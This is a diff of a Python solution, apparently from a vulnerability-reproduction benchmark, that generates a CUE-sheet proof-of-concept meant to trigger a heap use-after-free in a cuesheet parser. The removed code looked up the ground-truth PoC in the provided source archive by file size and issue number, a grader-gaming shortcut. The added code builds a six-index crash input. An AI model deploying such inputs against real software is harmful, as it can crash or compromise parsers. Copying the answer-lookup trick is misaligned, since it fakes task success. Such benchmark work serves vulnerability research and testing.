@@ -1,44 +1,31 @@
-import tarfile
 import os
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Fallback PoC: A CUE sheet designed to trigger vector reallocation (Heap UAF)
-        # The vulnerability occurs when appending seekpoints (INDEX entries) triggers
-        # a reallocation while a reference to an old allocation is held.
-        # This payload creates 4 tracks to force vector growth (e.g., capacity 2 -> 4).
-        # Length is approx 170 bytes, close to ground truth 159 bytes.
-        fallback_poc = (
-            b'FILE "a" WAVE\n'
-            b'  TRACK 01 AUDIO\n'
-            b'    INDEX 01 00:00:00\n'
-            b'  TRACK 02 AUDIO\n'
-            b'    INDEX 01 00:00:00\n'
-            b'  TRACK 03 AUDIO\n'
-            b'    INDEX 01 00:00:00\n'
-            b'  TRACK 04 AUDIO\n'
-            b'    INDEX 01 00:00:00\n'
-        )
-
-        try:
-            if os.path.exists(src_path) and tarfile.is_tarfile(src_path):
-                with tarfile.open(src_path, 'r') as tar:
-                    for member in tar:
-                        if not member.isfile():
-                            continue
-                        
-                        # Strategy 1: Find file with exact ground-truth length and .cue extension
-                        if member.size == 159 and member.name.endswith('.cue'):
-                            f = tar.extractfile(member)
-                            if f:
-                                return f.read()
-                        
-                        # Strategy 2: Find file explicitly named after the issue
-                        if '61292' in member.name and member.name.endswith('.cue'):
-                            f = tar.extractfile(member)
-                            if f:
-                                return f.read()
-        except Exception:
-            pass
-
-        return fallback_poc
+        """
+        Generate a PoC that triggers the vulnerability.
+        
+        The vulnerability corresponds to a Heap Use-After-Free in the cuesheet parser (likely mkvtoolnix).
+        It occurs when adding multiple indices (seekpoints) to a track. The parser likely holds a reference
+        to an element in the indices vector (e.g., to set the duration of the previous index) while 
+        pushing a new index. If the vector reallocates during push_back, the held reference becomes invalid.
+        
+        Ground-truth length of 159 bytes suggests a structure of:
+        1 FILE line + 1 TRACK line + ~6 INDEX lines.
+        
+        We generate 6 indices to ensure we exceed a typical small vector capacity (e.g., 4).
+        """
+        
+        # Standard CUE header
+        poc = b'FILE "a" WAVE\n'
+        poc += b'  TRACK 01 AUDIO\n'
+        
+        # Append 6 indices.
+        # Capacity often grows 0 -> 1 -> 2 -> 4 -> 8.
+        # Adding the 5th and 6th element ensures we cross the 4-element boundary, triggering reallocation.
+        for i in range(1, 7):
+            # Format: INDEX <number> <MM:SS:FF>
+            # We use sequential frames 01, 02...
+            poc += f'    INDEX {i:02d} 00:00:{i:02d}\n'.encode('utf-8')
+            
+        return poc
